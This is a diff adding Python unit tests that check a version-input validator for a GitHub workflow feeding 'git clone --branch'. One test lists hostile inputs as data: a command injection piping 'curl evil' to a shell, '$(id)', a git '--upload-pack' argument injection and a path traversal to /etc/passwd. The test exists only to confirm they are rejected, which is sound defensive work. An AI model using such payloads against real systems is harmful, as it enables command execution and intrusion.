@@ -8,6 +8,7 @@ Run: python3 tests/scripts/upgrade-gate_test.py
 import os
 import subprocess
 import sys
+import tempfile
 import unittest
 
 SCRIPT = os.path.join(
@@ -77,6 +78,52 @@ class UpgradeGate(unittest.TestCase):
 
     def test_extra_component_is_bad_input(self):
         self.assertEqual(compare("0.7.0.1", "0.7.0").returncode, 2)
+
+
+class Normalize(unittest.TestCase):
+    """The dispatch input's shape check (aj604/toolshed#127).
+
+    A human types the target version into `workflow_dispatch`, and that value
+    names a git ref in a `git clone --branch`. It reaches the clone only as this
+    subcommand's output, so anything that is not three decimal components has to
+    fail here rather than become argv.
+    """
+
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(self.tmp.cleanup)
+        self.out = os.path.join(self.tmp.name, "github-output.txt")
+
+    def normalize(self, version):
+        return run("normalize", "--version", version, "--out", self.out)
+
+    def written(self):
+        with open(self.out, encoding="utf-8") as f:
+            return f.read()
+
+    def test_it_writes_the_parsed_version_to_the_output_file(self):
+        r = self.normalize("0.37.0")
+        self.assertEqual(r.returncode, 0, r.stderr)
+        self.assertEqual(r.stdout.strip(), "0.37.0")
+        self.assertEqual(self.written(), "target=0.37.0\n")
+
+    def test_it_strips_a_leading_v(self):
+        self.assertEqual(self.normalize("v1.2.3").stdout.strip(), "1.2.3")
+
+    def test_it_appends_so_earlier_step_outputs_survive(self):
+        with open(self.out, "w", encoding="utf-8") as f:
+            f.write("current=0.1.0\n")
+        self.normalize("0.2.0")
+        self.assertEqual(self.written(), "current=0.1.0\ntarget=0.2.0\n")
+
+    def test_a_ref_expression_is_refused(self):
+        for hostile in ("0.37.0; curl evil | sh", "main", "../../etc/passwd",
+                        "0.37.0 --upload-pack=evil", "$(id)", ""):
+            with self.subTest(hostile=hostile):
+                r = self.normalize(hostile)
+                self.assertEqual(r.returncode, 2, hostile)
+                self.assertFalse(os.path.exists(self.out)
+                                 and "target=" in self.written())
 
 
 if __name__ == "__main__":
